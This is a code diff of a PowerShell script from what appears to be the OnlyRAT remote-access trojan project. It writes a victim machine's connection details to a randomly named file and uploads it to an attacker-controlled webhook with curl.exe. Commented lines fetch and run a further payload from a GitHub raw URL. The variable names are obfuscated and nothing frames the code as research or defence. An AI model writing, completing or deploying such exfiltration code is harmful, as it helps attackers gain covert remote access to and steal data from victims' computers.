@@ -49,11 +49,11 @@ Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote host
 Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote port
 Add-Content -Path $CRYnrkaDbe -Value 'local' # connection type
 
-# $file = "file=\@$CRYnrkaDbe"
+$file = "file=\@$CRYnrkaDbe"
 
 # send file to webhook
 $PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
-curl.exe -F "payload_json={\`"username\`": \`"cosmo\`", \`"content\`": \`"download me\`"}" -F "file=\@$CRYnrkaDbe" $PEBgxuJUfd
+curl.exe -F "payload_json={\`"username\`": \`"cosmo\`", \`"content\`": \`"download me\`"}" -F $file $PEBgxuJUfd
 
 # Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
 # Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"
